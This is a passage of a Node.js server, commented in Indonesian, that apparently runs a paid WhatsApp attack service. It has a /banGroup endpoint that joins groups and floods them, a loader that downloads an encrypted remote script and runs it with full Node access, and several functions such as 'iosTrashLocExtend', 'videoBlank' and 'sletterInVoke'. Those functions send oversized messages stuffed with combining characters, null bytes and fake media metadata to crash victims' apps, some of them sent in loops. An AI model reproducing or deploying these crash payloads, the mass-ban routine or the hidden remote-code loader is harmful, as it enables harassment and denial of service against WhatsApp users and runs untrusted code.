        const user = db.find(u => u.username === keyInfo.username);
        if (user) {
            if (!user.senders) user.senders = [];
            if (!user.senders.includes(number)) {
                user.senders.push(number);
                saveDatabase(db);
            }
        }

        res.json({
            valid: true,
            message: `Sender ${number} berhasil dibuat!`,
            number: number,
            otp: result.otp
        });

    } catch (error) {
        res.json({ valid: false, message: error.message });
    }
});

// ════════════════════════════════════════════════════════════════════════════
// ENDPOINT: /banGroup — VERSI KE-2 (BURST + PARALLEL)
// ════════════════════════════════════════════════════════════════════════════

app.get("/banGroup", async (req, res) => {
  const { key, link, count, burst, delay } = req.query;

  console.log("[BAN GB] 📥 Request received | link: " + link);

  // Validasi key
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }

  // ─── SEMUA ROLE BISA AKSES ──────────────────────────────────
  const allowedRoles = [
    "owner", "dev", "tk", "tangan kanan", "admin",
    "reseller", "member", "vip", "moderator", "partner",
    "founder", "high admin", "high owner"
  ];

  const userRole = (user.role || "member").toLowerCase();
  if (!allowedRoles.includes(userRole)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  // Validasi link
  if (!link) {
    return res.json({ valid: false, message: "Link required" });
  }

  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) {
    return res.json({ valid: false, message: "Invalid group link" });
  }

  // Cek sender aktif
  const sock = await checkActiveSessionInFolder(user.username);
  if (!sock) {
    return res.json({ 
      valid: false, 
      message: "No active sender. Add 1 sender first." 
    });
  }

  // Kirim response duluan
  res.json({ 
    valid: true, 
    message: "Ban group started...",
    status: "processing",
    role: user.role,
    config: {
      count: parseInt(count) || 100,
      burst: parseInt(burst) || 10,
      delay: parseInt(delay) || 500
    }
  });

  // ─── PROSES DI BACKGROUND ───────────────────────────────────
  setImmediate(async () => {
    try {
      const code = match[1];

      // ─── JOIN GRUP ──────────────────────────────────────────
      console.log("[BAN GB] 🔗 Joining group: " + code);
      
      let groupJid;
      try {
        groupJid = await sock.groupAcceptInvite(code);
        console.log("[BAN GB] ✅ Joined: " + groupJid);
      } catch (e) {
        console.error("[BAN GB] ❌ Join failed: " + e.message);
        if (wsClients[user.username]) {
          wsClients[user.username].send(JSON.stringify({
            type: "ban_group_result",
            result: { success: false, error: "Join failed: " + e.message },
            status: "failed"
          }));
        }
        return;
      }

      // ─── TUNGGU SYNC ────────────────────────────────────────
      await sleep(3000);

      // ─── VERIFY GRUP ────────────────────────────────────────
      try {
        const metadata = await sock.groupMetadata(groupJid);
        console.log("[BAN GB] 📊 Group: " + metadata.subject + " | Members: " + metadata.participants.length);
        
        const isAdmin = metadata.participants.some(p => 
          p.id === sock.user.id && p.admin
        );
        console.log("[BAN GB] 👑 Sender is admin: " + isAdmin);
      } catch (e) {
        console.error("[BAN GB] ⚠️ Metadata error: " + e.message);
      }

      // ─── JALANKAN groupBan1() VERSI KE-2 ────────────────────
      const loopCount = parseInt(count) || 100;
      const burstSize = parseInt(burst) || 10;
      const delayMs = parseInt(delay) || 500;
      
      const result = await groupBan1(sock, groupJid, {
        loopCount: loopCount,
        burstSize: burstSize,
        delay: delayMs
      });

      // ─── KIRIM HASIL KE APK ─────────────────────────────────
      if (wsClients[user.username]) {
        wsClients[user.username].send(JSON.stringify({
          type: "ban_group_result",
          groupJid: groupJid,
          result: result,
          status: result.success ? "success" : "failed"
        }));
      }

      // ─── LOG ────────────────────────────────────────────────
      fs.appendFileSync("ban_log.txt", 
        "[" + new Date().toISOString() + "] " + user.username + " → " + groupJid + " | Sent: " + result.totalSent + " | SenderLogout: " + result.senderDisconnected + "\n"
      );

      // ─── LEAVE GRUP ─────────────────────────────────────────
      await sleep(2000);
      await sock.groupLeave(groupJid).catch(() => {});

    } catch (err) {
      console.error("[BAN GB] ❌ Fatal error: " + err.message);
    }
  });
});

// ═══════════════════════════════════════════════════════════
// WA REACT — Integrasi wareak2.js
// ═══════════════════════════════════════════════════════════
const { execFile } = require('child_process');

app.post('/api/react/send', express.json(), async (req, res) => {
  const { key, waUrl, emojis } = req.body;

  // Auth
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: 'Invalid key' });
  }

  // Validasi input
  if (!waUrl || !waUrl.startsWith('http')) {
    return res.status(400).json({ valid: false, message: 'waUrl tidak valid' });
  }

  // Cooldown check (5 menit per user)
  const db = loadDatabase();
  const userIdx = db.findIndex(u => u.username === keyInfo.username);
  if (userIdx === -1) {
    return res.json({ valid: false, message: 'User not found' });
  }

  const user = db[userIdx];
  const now = Date.now();
  const lastReact = user.lastReact || 0;
  const cooldownMs = 5 * 60 * 1000;

  if (now - lastReact < cooldownMs) {
    const sisa = Math.ceil((cooldownMs - (now - lastReact)) / 1000);
    return res.json({
      valid: false,
      cooldown: true,
      wait: sisa,
      message: `Cooldown ${sisa}s`
    });
  }

  // Update cooldown
  db[userIdx].lastReact = now;
  saveDatabase(db);

  // Kirim response duluan (async)
  res.json({
    valid: true,
    sended: true,
    message: 'Reaction sedang diproses...',
    username: keyInfo.username
  });

  // Jalanin script di background
  setImmediate(() => {
    const scriptPath = path.join(__dirname, 'wareak2.js');
    const emojiArg = emojis || '😂';

    console.log(`[REACT] ${keyInfo.username} → ${waUrl} | ${emojiArg}`);

    execFile('node', [scriptPath, waUrl, emojiArg], {
      timeout: 90000,
      maxBuffer: 1024 * 1024 * 5,
      cwd: __dirname
    }, (err, stdout, stderr) => {
      const logLine = `[${new Date().toISOString()}] ${keyInfo.username} → ${waUrl} | ${emojiArg}\n`;

      if (err) {
        console.error(`[REACT ❌] ${keyInfo.username}: ${err.message}`);
        fs.appendFileSync('react_log.txt', logLine + `ERROR: ${err.message}\n${stderr}\n`);
      } else {
        console.log(`[REACT ✅] ${keyInfo.username} done`);
        fs.appendFileSync('react_log.txt', logLine + `OK\n${stdout.slice(-500)}\n`);

        // Notif via WebSocket kalau user online
        if (wsClients[keyInfo.username]) {
          wsClients[keyInfo.username].send(JSON.stringify({
            type: 'react:done',
            waUrl,
            message: '✅ Reaction terkirim!'
          }));
        }
      }
    });
  });
});

// Cek status react terakhir
app.get('/api/react/status', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const now = Date.now();
  const lastReact = user.lastReact || 0;
  const cooldownMs = 5 * 60 * 1000;
  const remaining = Math.max(0, Math.ceil((cooldownMs - (now - lastReact)) / 1000));

  res.json({
    valid: true,
    lastReact: user.lastReact ? new Date(user.lastReact).toISOString() : null,
    cooldownRemaining: remaining,
    canUse: remaining === 0
  });
});

console.log('[🎯 REACT] WA React endpoints registered: /api/react/send, /api/react/status');

// ═══════════════════════════════════════════════════════════
// SPOTIFY — Search & Download
// ═══════════════════════════════════════════════════════════

// Search lagu
app.get('/api/spotify/search', async (req, res) => {
  const { key, q: query } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
  if (!query) return res.json({ valid: false, message: 'Query required' });

  try {
    const url = `https://api.ikyyxd.my.id/search/spotifyplay?query=${encodeURIComponent(query)}`;
    const r = await axios.get(url, { timeout: 15000 });

    if (!r.data.status || !r.data.result) {
      return res.json({ valid: false, message: 'Lagu tidak ditemukan' });
    }

    const s = r.data.result;

    return res.json({
      valid: true,
      result: {
        title: s.title,
        artist: s.artist,
        album: s.album || '-',
        duration: s.duration || '-',
        thumbnail: s.thumbnail || null,
        url: s.url || null,
        download: s.download || null
      }
    });
  } catch (e) {
    console.error('[SPOTIFY] search error:', e.message);
    return res.json({ valid: false, message: e.message });
  }
});

// Search multi (kalau API support list)
app.get('/api/spotify/search-all', async (req, res) => {
  const { key, q: query } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
  if (!query) return res.json({ valid: false, message: 'Query required' });

  try {
    const url = `https://riimusic.my.id/api/spotify/search?apikey=riicode&query=${encodeURIComponent(query)}`;
    const r = await axios.get(url, { timeout: 15000 });

    const songs = r.data?.result?.songs || [];
    if (!songs.length) {
      return res.json({ valid: false, message: 'Lagu tidak ditemukan' });
    }

    return res.json({
      valid: true,
      results: songs.slice(0, 10).map(s => ({
        title: s.title,
        artist: s.artist,
        album: s.album || '-',
        duration: s.duration || '-',
        thumbnail: s.thumbnail || null,
        url: s.url,
        download: s.download || null
      }))
    });
  } catch (e) {
    console.error('[SPOTIFY] search-all error:', e.message);
    return res.json({ valid: false, message: e.message });
  }
});

// Proxy audio — biar bisa play di browser tanpa CORS
app.get('/api/spotify/stream', async (req, res) => {
  const { key, url } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).send('Invalid key');
  if (!url) return res.status(400).send('URL required');

  try {
    const r = await axios.get(url, {
      responseType: 'stream',
      timeout: 30000,
      headers: { 'User-Agent': 'Mozilla/5.0' }
    });

    res.setHeader('Content-Type', r.headers['content-type'] || 'audio/mpeg');
    res.setHeader('Accept-Ranges', 'bytes');
    res.setHeader('Access-Control-Allow-Origin', '*');
    if (r.headers['content-length']) {
      res.setHeader('Content-Length', r.headers['content-length']);
    }

    r.data.pipe(res);
  } catch (e) {
    console.error('[SPOTIFY] stream error:', e.message);
    res.status(500).send('Stream error');
  }
});

console.log('[🎵 SPOTIFY] Endpoints registered: /api/spotify/search, /api/spotify/search-all, /api/spotify/stream');

// ============================================================
// END API PREFIX ROUTER
// ============================================================

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    // Sandbox VM
    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      //clearTimeout,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}



if (false) {
  // Disabled unsafe automatic Yuukey/WhatsApp payload block.
let memek = { mutex: async (_key, fn) => await fn() };
let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let porno = Yuukey.createParticipantNodes.bind(Yuukey);
let yntkts = Yuukey.encodeWAMessage?.bind(Yuukey);

Yuukey.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (Yuukey.patchMessageBeforeSending?.(message, recipientJids) ?? message);
let ywdh = Array.isArray(patched)
? patched
: recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

let { id: meId, lid: meLid } = Yuukey.authState.creds.me;
let omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
let { user: targetUser } = jidDecode(jid);
let { user: ownPnUser } = jidDecode(meId);
let isOwnUser = targetUser === ownPnUser || targetUser === omak;
let y = jid === meId || jid === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

return memek.mutex(jid, async () => {
let { type, ciphertext } = await Yuukey.signalRepository.encryptMessage({ jid, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return {
tag: 'to',
attrs: { jid },
content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
};
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

async function initCall() {
  let awik = crypto.randomBytes(32);
  let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
  let { nodes: destinations, shouldIncludeDeviceIdentity } = await Yuukey.createParticipantNodes(devices, { conversation: "7eppeli - Exposed" }, { count: '0' });

 let stanza = {
tag: "call",
attrs: { to: target, id: Yuukey.generateMessageTag(), from: Yuukey.user.id },
content: [{
tag: "offer",
attrs: {
"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
"call-creator": Yuukey.user.id
},
content: [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{
tag: "device-identity",
attrs: {},
content: encodeSignedDeviceIdentity(Yuukey.authState.creds.account, true)
}] : [])
]
}]
};
  
}

initCall();


await Yuukey.sendNode(stanza);

/*
for(let z = 0; z < 20; z++) {
await x(sock, "6285718431266@s.whatsapp.net")
}
*/
}
async function iosTrashLocExtend(sock, target) {
const TrashIosx = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿".repeat(60000); 
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://whatsappx-ios.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }

      let extendMsg = {
         extendedTextMessage: { 
            text: "‼️⃟ ‌‌./r4Ldz`impõssible. ✩" + TrashIosx, 
            matchedText: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰr4Ldz`impõssible. ✩",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "‼️⃟ ‌‌./r4Ldz`impõssible. ✩" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      for (let i = 0; i < 100; i++) {
      await sleep(1000);
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msgx.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      }
   } catch (err) {
      console.error(err);
   }
};

async function iOSxTend(sock, target) {
  const etc = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "💤‼️⃟⃰ᰧ./### ✩ > https://Wa.me/stickerpack/RaldzzXyz" + "𑇂𑆵𑆴𑆿".repeat(15000),
        matchedText: "https://Wa.me/stickerpack/RaldzzXyz",
        description:
          "҉҈⃝⃞⃟⃠⃤꙰꙲" +
          "𑇂𑆵𑆴𑆿".repeat(50000),
        title:
          "💤‼️⃟⃰ᰧ./### ✩" +
          "𑇂𑆵𑆴𑆿".repeat(50000),
        previewType: "NONE",
        jpegThumbnail: null,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now(),
    }
  );

  await sock.relayMessage(target, etc.message, {
    messageId: etc.key.id,
  });
}
async function videoBlank(sock, target) {
  const cards = [];
    const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
    fileLength: "107374182400",
    seconds: 999999999,
    mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
    height: 9999,
    width: 9999,
    fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
    directPath: "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1751081957",
    jpegThumbnail: null, 
    streamingSidecar: null
  }
   const header = {
    videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "-" + Date.now(),
      participant: "1@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
              mediaType: 1,
              sourceUrl: "https://xnxx.com", 
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 50; i++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "ꦽ".repeat(45000)
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "Lolipop Xtream" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"],
              externalAdReply: {
                title: "ោ៝".repeat(10000),
                body: "Hallo ! ",
                thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "t.me/Xatanicvxii",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}
async function sletterInVoke(sock, target) {
  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "33333333333333333@newsletter",
            newsletterName: "Hallo Izin Push Kontak" + "ી".repeat(120000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
            inviteExpiration: Date.now() + 1814400000,
          },
        },
      },

      nativeFlowMessage: {
        messageParamsJson: "",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: "{}",
          },
          {
            name: "galaxy_message",
            paramsJson: {
              screen_2_OptIn_0: true,
              screen_2_OptIn_1: true,
              screen_1_Dropdown_0: "nullOnTop",
              screen_1_DatePicker_1: "1028995200000",
              screen_1_TextInput_2: "null@gmail.com",
              screen_1_TextInput_3: "94643116",
              screen_0_TextInput_0: "\u0000".repeat(500000),
              screen_0_TextInput_1: "SecretDocu",
              screen_0_Dropdown_2: "#926-Xnull",
              screen_0_RadioButtonsGroup_3: "0_true",
              flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s.",
            },
          },
        ],
      },

      contextInfo: {
        mentionedJid: ["0@s.whatsapp.net"],
        groupMentions: [
          {
            groupJid: "0@s.whatsapp.net",
            groupSubject: "#Syonx-Tzy",
          },
        ],
      },
    };

    await sock.relayMessage(target, message, {
      userJid: target,
      participant: { jid: target },
    });

  } catch (err) {
    console.error("Error sending VampireBugIns:", err);
  }
}

async function sepongui(target) {
     let sections = [];
     
     let listMessage = {
        title: "💧𝐕𝐀𝐍𝐙𝐙𝐌𝐃 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞💧",
        sections: sections,
      };
    await relayMessage(
        target, {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 0,
                        degreesLongitude: 0,
                        caption: '💧𝐕𝐀𝐍𝐙𝐙𝐌𝐃 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞💧'+ "ꦿꦾ".repeat(100000) + "@1".repeat(50000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                        nativeFlowMessage: {
